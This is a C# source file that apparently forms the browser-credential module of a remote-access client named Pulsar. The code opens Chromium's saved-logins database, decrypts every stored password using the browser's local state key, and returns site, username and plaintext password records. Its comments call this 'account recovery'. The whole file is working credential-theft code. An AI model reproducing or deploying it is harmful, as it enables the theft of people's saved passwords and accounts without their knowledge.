﻿using Pulsar.Client.Recovery.Utilities;
using Pulsar.Common.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
namespace Pulsar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides basic account recovery capabilities from chromium-based applications.
    /// </summary>
    public class ChromiumBase
    {

        /// <summary>
        /// Reads the stored accounts of an chromium-based application.
        /// </summary>
        /// <param name="filePath">The file path of the logins database.</param>
        /// <param name="localStatePath">The file path to the local state.</param>
        /// <returns>A list of recovered accounts.</returns>
        public static List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath, string appName)
        {
            var result = new List<RecoveredAccount>();

            if (appName == "Local")
            {
                return result;
            }

            Debug.WriteLine(filePath);
            Debug.WriteLine(localStatePath);
            Debug.WriteLine(appName);

            if (File.Exists(filePath))
            {
                SQLiteHandler sqlDatabase;

                if (!File.Exists(filePath))
                    return result;

                var decryptor = new ChromiumDecryptor(localStatePath);

                try
                {
                    sqlDatabase = new SQLiteHandler(filePath);
                }
                catch (Exception)
                {
                    return result;
                }

                if (!sqlDatabase.ReadTable("logins"))
                    return result;

                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {

                        var host = sqlDatabase.GetValue(i, "origin_url");
                        //Debug.WriteLine(host);
                  
                        var user = sqlDatabase.GetValue(i, "username_value");
                        //Debug.WriteLine(user);

                        var value = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));

                        if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user))
                            continue;

                        result.Add(new RecoveredAccount
                        {
                            Url = host,
                            Username = user,
                            Password = value,
                            Application = appName
                        });

                    }
                    catch (Exception e)
                    {
                        Debug.WriteLine(e);
                    }
                }
            }
            else
            {
                throw new FileNotFoundException("Can not find chromium logins file");
            }

            return result;
        }
    }
}
